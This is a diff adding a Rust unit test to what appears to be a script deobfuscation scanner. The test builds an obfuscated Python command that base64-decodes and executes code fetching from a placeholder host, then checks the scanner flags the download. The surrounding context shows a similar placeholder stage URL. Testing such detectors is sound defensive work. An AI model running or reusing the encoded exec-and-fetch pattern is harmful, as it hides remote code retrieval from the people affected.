@@ -10925,6 +10925,29 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_dunder_import_base64_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/dunder-import-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(__import__('base64').b64decode('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/dunder-import-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from __import__ Python b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn deob_text_var_substring_assembled_url_is_scanned_after_resolution() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.set("scheme", "https");
